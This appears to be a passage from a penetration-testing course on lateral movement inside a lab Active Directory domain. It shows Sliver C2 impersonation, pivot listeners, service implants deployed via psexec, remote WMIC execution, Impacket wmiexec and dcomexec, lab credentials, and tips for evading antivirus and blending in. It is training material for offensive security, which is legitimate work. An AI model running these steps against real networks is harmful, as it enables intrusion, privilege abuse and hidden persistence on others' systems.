Lateral Movement is the process where an attacker utilizes harvested credentials of other users, or by hijacking processes that run in the context of other users, to access resources as those users. Those resources can be on other machines across the domain.

Note: The user `svc_sql` is local admin on both SRV01 and SRV02. This can be checked by setting up a proxy and using CrackMapExec.

#### PsExec

[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool from the Microsoft Sysinternals suite. PsExec works by uploading a service binary to the target and creating and starting a new Windows service to execute the binary. Finally, we will get interactive access with SYSTEM privilege. If a compromised user has local administrator privilege on other hosts, we can leverage PsExec to move laterally. There are two prerequisites: the target host has port 445 open, and the user has local administrator privileges on the target host. Since Microsoft signs PsExec.exe, it will not be flagged by AV. In addition, many C2 frameworks have the psexec lateral movement feature, such as Meterpreter, CobaltStrike, etc. However, those executable service binaries generated by these C2 frameworks are very easy to be flagged by AV, so try to avoid using them. For demonstration, the credentials needed for moving laterally to SRV01 are: `svc_sql:jkhnrjk123!`. The `psexec` utility in Sliver can operate based on a profile, where the profile needs to be in a `service` format for the binary to be uploaded and started as a service on the target machine with the help of the Service Manager. To reach the SRV01 machine with the credentials above, we need to create a new logon session using the `make-token` utility, allowing us to impersonate a user. Other utilities such as `impersonate` and `runas` can be used to get an authentication session. This also can be done via a sacrificial process started with the help of Rubeus.

  Lateral Movement

```shell-session
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!


[*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert to your previous token.
```

 Check the [source code](https://github.com/BishopFox/sliver/blob/master/implant/sliver/priv/priv_windows.go) to understand the implementations of make-token, impersonate, and runas. Be careful with these commands; even calls like LogonUserA, and ImpersonateLoggedOnUser are made with syscalls.

Having impersonated the `svc_sql` user, we can test our access to the resources on SRV01 by listing the contents of the `C:\` directory.

  Lateral Movement

```shell-session
sliver (http-beacon) > ls //srv01.child.htb.local/c$

\\srv01.child.htb.local\c$\ (12 items, 704.0 MiB)
=================================================
drwxrwxrwx  $Recycle.Bin                        <dir>      Wed Sep 14 11:55:41 -0700 2022
Lrw-rw-rw-  Documents and Settings -> C:\Users  0 B        Tue Sep 13 11:58:35 -0700 2022
-rw-rw-rw-  pagefile.sys                        704.0 MiB  Tue Oct 31 10:51:23 -0700 2023
drwxrwxrwx  PerfLogs                            <dir>      Sat Sep 15 00:19:00 -0700 2018
dr-xr-xr-x  Program Files                       <dir>      Wed Jul 19 06:40:02 -0700 2023
drwxrwxrwx  Program Files (x86)                 <dir>      Wed Sep 14 11:04:07 -0700 2022
drwxrwxrwx  ProgramData                         <dir>      Wed Jul 19 06:40:02 -0700 2023
drwxrwxrwx  Recovery                            <dir>      Tue Sep 13 11:58:41 -0700 2022
drwxrwxrwx  SQL2019                             <dir>      Wed Sep 14 10:46:10 -0700 2022
drwxrwxrwx  System Volume Information           <dir>      Tue Sep 13 12:19:00 -0700 2022
dr-xr-xr-x  Users                               <dir>      Wed Sep 14 11:55:36 -0700 2022
drwxrwxrwx  Windows                             <dir>      Sat Oct 15 14:14:52 -0700 2022
```

As seen from the output, we have successfully verified our access using `svc_sql`'s session (credentials) on SRV01.

Before we run the `psexec` utility, a [pivot listener](https://sliver.sh/docs?name=Pivots) is needed as it will be used to communicate between SRV01 -> WEB01. Simply put, as SRV01 cannot directly communicate to us, SRV01 will communicate to WEB01 from which the chain of communication will be established. The `pivots` utility supports `tcp` pivot listener(s) and `named-pipe` listener(s).

The `tcp` pivot listener requires a `bind` address to be specified, which in our case is the IP address of WEB01 (`172.16.1.11` internal); by default, every `tcp` pivot listener will listen on port `9898`.

  Lateral Movement

```shell-session
sliver (http-beacon) > pivots tcp --bind 172.16.1.11

[*] Started tcp pivot listener 172.16.1.11:9898 with id 1
```

With the pivot listener started and in place, we need to proceed with creating an implant; the implant, as mentioned, must be in a `service` format. Again, we will disable symbol obfuscation, and we will use arbitrary names for the service and, respectively, the description; this is done with the intent of blending in. By default, the used name for the service is `Sliver` and `Sliver implant` for the description. The `pivots` command can be used to display the current pivot listeners.

  Lateral Movement

```shell-session
sliver (http-beacon) > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac590/psexec-pivot.exe
```

Jumping into the `psexec` utility, we must specify the path of the implant's binary.

  Lateral Movement

```shell-session
sliver (http-beacon) > psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local

[*] Uploaded service binary to \\srv01.child.htb.local\C$\windows\temp\51gramfp.exe
[*] Waiting a bit for the file to be analyzed ...
[*] Successfully started service on srv01.child.htb.local (c:\windows\temp\51gramfp.exe)
[*] Successfully removed service Teams on srv01.child.htb.local

[*] Session 23471b15 psexec-pivot - 10.129.205.234:49721->http-beacon-> (srv01) - windows/amd64 - Tue, 31 Oct 2023 11:43:48 GMT

sliver (http-beacon) > sessions

 ID         Name           Transport   Remote Address                        Hostname   Username              Operating System   Locale   Last Message                            Health  
========== ============== =========== ===================================== ========== ===================== ================== ======== ======================================= =========
 23471b15   psexec-pivot   pivot       10.129.205.234:49721->http-beacon->   srv01      NT AUTHORITY\SYSTEM   windows/amd64      en-US    Tue Oct 31 11:43:48 GMT 2023 (5s ago)   [ALIVE] 
 41e2012e   http-beacon    http(s)     10.129.205.234:49721                  web01      CHILD\eric            windows/amd64      en-US    Tue Oct 31 11:43:51 GMT 2023 (2s ago)   [ALIVE] 

sliver (http-beacon) > pivots 

 ID   Protocol   Bind Address       Number Of Pivots 
==== ========== ================== ==================
  1   TCP        172.16.1.11:9898                  1 
```

 Note that Sliver (psexec) will generate a random file name, and by default, it will place it in C:\Windows\Temp, which can be monitored.

#### WMIC

WMIC (Windows Management Instrumentation) is a Windows Administration feature that provides a uniform environment for local and remote access to Windows System components. System administrators can create VBScript or PowerShell scripts to manage Windows machines locally and remotely. WMI is also a native way for lateral movement and remote code execution; it requires local administrator privilege.

Proceed to generate an implant through Sliver:

  Lateral Movement

```shell-session
sliver (http-beacon) > generate -i 172.16.1.11:9898 --skip-symbols -N wmicpivot

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac590/wmicpivot.exe
```

Right after having the implant generated, we would proceed by creating a logon session using `make-token` as explained earlier, and we need to upload the binary on disk on SRV02.

  Lateral Movement

```shell-session
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!


[*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert to your previous token.
sliver (http-beacon) > cd //srv02.child.htb.local/c$/windows/tasks

[*] \\srv02.child.htb.local\c$\windows\tasks
sliver (http-beacon) > upload wmicpivot.exe

[*] Wrote file to \\srv02.child.htb.local\c$\windows\tasks\wmicpivot.exe

sliver (http-beacon) > rev2self

[*] Back to self...
```

We can execute the wmic command to execute an implant on the remote host SRV02 via the beacon/session on WEB01.

  Lateral Movement

```shell-session
wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\tasks\\wmicpivot.exe"
```

The above command can be executed via a PowerShell terminal on WEB01 or through the beacon.

  Lateral Movement

```shell-session
sliver (http-beacon) >  execute -o wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"

[*] Output:
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
	ProcessId = 1128;
	ReturnValue = 0;
};
[*] Stderr:
```

Having executed the command, it will take advantage of the previous `pivot` that we have started on port 9898 and will connect back to WEB01.

  Lateral Movement

```shell-session
[*] Session d35ddf7e wmicpivot - 10.129.205.234:49715->http-beacon-> (srv02) - windows/amd64 - Wed, 08 Nov 2023 08:43:20 GMT

sliver (http-beacon) > pivots

 ID   Protocol   Bind Address       Number Of Pivots 
==== ========== ================== ==================
  1   TCP        172.16.1.11:9898                  1 

sliver (http-beacon) > sessions

 ID         Name          Transport   Remote Address                        Hostname   Username        Operating System   Locale   Last Message                             Health  
========== ============= =========== ===================================== ========== =============== ================== ======== ======================================== =========
 d35ddf7e   wmicpivot         pivot       10.129.205.234:49715->http-beacon->   srv02      CHILD\svc_sql   windows/amd64      en-US    Wed Nov  8 08:43:20 GMT 2023 (15s ago)   [ALIVE] 
 b1ee85c3   http-beacon   http(s)     10.129.205.234:49715                  web01      CHILD\eric      windows/amd64      en-US    Wed Nov  8 08:43:33 GMT 2023 (2s ago)    [ALIVE] 
```

An additional way of getting a shell on SRV02 would be possible with the help of `wmiexec.py` part of [Impacket](https://github.com/fortra/impacket), enabling us to get remote code execution on a remote host via WMI.

  Lateral Movement

```shell-session
yovecio@htb[/htb]$ proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@172.16.1.13
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:49696  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
srv02
```

 wmiexec.py could get detected because it writes the output of the command execution to a file on the ADMIN$ by default. We can specify the target share with the "-share" and choosing the C$, for example.

#### DCOM

Per [Microsoft](https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model), Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), and others. For attackers, DCOM can also be used for remote code execution and lateral movement. The example below showcases the usage of `dcomexec`, part of [Impacket](https://github.com/fortra/impacket), to obtain a shell on SRV02. We currently specified object argument as `MMC20`. `ShellWindows`, and `ShellBrowserWindow` are also options.

  Lateral Movement

```shell-session
yovecio@htb[/htb]$ proxychains impacket-dcomexec -object MMC20 child/svc_sql:jkhnrjk123\!@172.16.1.13
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:49762  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
srv02
```